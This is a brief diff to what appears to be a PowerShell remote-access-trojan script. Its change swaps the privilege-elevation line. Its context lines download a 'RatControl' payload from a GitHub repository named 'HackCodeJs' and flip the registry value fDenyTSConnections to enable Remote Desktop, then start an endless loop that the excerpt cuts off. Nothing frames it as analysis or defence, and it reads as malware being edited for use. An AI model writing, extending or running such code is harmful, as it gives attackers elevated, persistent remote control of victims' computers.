@@ -1,4 +1,4 @@
-Start-Process powershell -Verb runAs
+start -verb runas '%0' am_admin & exit /b
 $Com =  (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MrCubeCode/HackCodeJs/refs/heads/main/RatControl')
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
 while ($true) {
